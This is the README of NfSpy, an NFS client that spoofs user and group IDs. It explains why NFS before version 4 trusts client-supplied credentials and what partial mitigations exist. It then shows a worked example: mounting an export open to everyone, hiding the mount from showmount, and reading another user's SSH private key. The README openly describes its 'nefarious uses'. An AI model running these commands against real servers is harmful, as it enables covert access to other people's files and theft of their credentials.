NfSpy - an ID-spoofing NFS client
=================================
by [Daniel Miller](mailto:bonsaiviking@gmail.com)

NfSpy is a library/program that uses the Filesystem in Userspace (FUSE)
library to automate the falsification of NFS credentials when mounting an NFS
share.

Vulnerability exploited
-----------------------

NFS before version 4 is reliant upon host trust relationships for
authentication. The NFS server trusts any client machines to authenticate users
and assign the same user IDs (UIDS) that the shared filesystem uses. This works
in NIS, NIS+, and LDAP domains, for instance, but only if you know the client
machine is not compromised, or faking its identity. This is because the only
authentication in the NFS protocol is the passing of the UID and GID (group
ID). There are a few things that can be done to enhance the security of NFS,
but many of them are incomplete solutions, and even with all three listed here,
it could still be possible to circumvent the security measures.

### Squash root

The server or the share ("export" in NFS lingo) can be configured squash_root,
meaning that any requests that come in claiming to be UID or GID 0 (root) will
be treated like the nobody user, or equivalent on the system. This does not
prevent an attacker from spoofing any other UID/GID combo, but will protect the
most sensitive info and configs on the export.

### nfs_portmon

Another setting that can be enabled is nfs_portmon, which denies requests
coming from source ports outside of the 513-1024 range. Since only root can
(usually) allocate these ports, this prevents a regular user on a trusted
machine from writing and using their own NFS client that fakes UID/GID. It does
nothing to stop a rogue host, a user with su permissions, or a root-level
compromised machine from doing the same thing.

### Export restrictions

Shares/exports can be controlled so that only certain machines can access them.
These Access Control Lists can consist of:

* IP addresses (e.g. 192.168.1.34)
* IP prefixes (e.g. @192.168.1)
* hostnames (e.g. server1.mydom.nis)
* host lists (e.g. @trusted_hosts)
* "everyone"

The best configuration would be to use a host list, since querying the nfs
daemon will just give the name of the list, not which addresses or names it
contains. Next in line would be IP addresses or hostnames, since those are more
difficult to spoof. IP prefixes and "everyone" are indications of insecurity,
since there is little or no restriction on what addresses can connect.

Using NfSpy
-----------

A list of options can be seen by running

    nfspy --help

### Example

There is an NFS server on 192.168.1.124.

    $ showmount -e 192.168.1.124
    Export list for 192.168.1.124:
    /home (everyone)

Mount up the share. Using sudo lets you bind to a privileged port, and the 
allow_other option lets any user use the filesystem. The other new option here
is "hide", which immediately "unmounts" the share on the server, but keeps the 
filehandle it got. This hides your presence from anyone using showmount -a

    $ sudo nfspy -o server=192.168.1.124:/home,hide,allow_other,ro,intr /mnt

Enjoy your newfound freedom!

    $ cd /mnt
    /mnt$ ls -l
    drwx------ 74 8888 200 4096 2011-03-03 09:55 smithj
    /mnt$ cd smithj
    /mnt/smithj$ cat .ssh/id.rsa
    -----BEGIN RSA PRIVATE KEY-----
    Proc-Type: 4,ENCRYPTED
    DEK-Info: DES-EDE3-CBC,30AEB543E512CA19
    <snip>

To unmount, use fusermount:

    $ sudo fusermount -u /mnt

BUGS
----

* NfSpy mounts read-only for now. The write-related methods will be
  written later.

* NfSpy is an NFSv2 client using TCP transport. As such, it will probably only
  work with NFSv3 servers which allow NFSv2 connections. NFSv2 is very old, and 
  some servers may not support it. Future releases will support NFSv3, but
  probably not NFSv4.

* NfSpy does not work with the standard lockd and statd services, which could
  cause problems when write support is added. For read-only, though, and most
  nefarious uses for which it was intended, this shouldn't be a problem.
